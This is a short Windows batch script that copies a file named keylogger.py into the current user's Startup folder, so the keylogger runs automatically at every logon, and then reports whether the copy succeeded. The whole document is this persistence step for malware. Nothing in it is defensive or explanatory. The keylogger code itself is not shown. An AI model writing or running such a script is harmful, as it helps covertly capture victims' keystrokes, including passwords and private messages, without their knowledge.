@echo off
set "source_path=keylogger.py"
set "destination_path=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy "%source_path%" "%destination_path%"
if errorlevel 1 (
    echo Failed to copy keylogger.py to autorun location.
) else (
    echo Successfully copied keylogger.py to autorun location.
)
pause
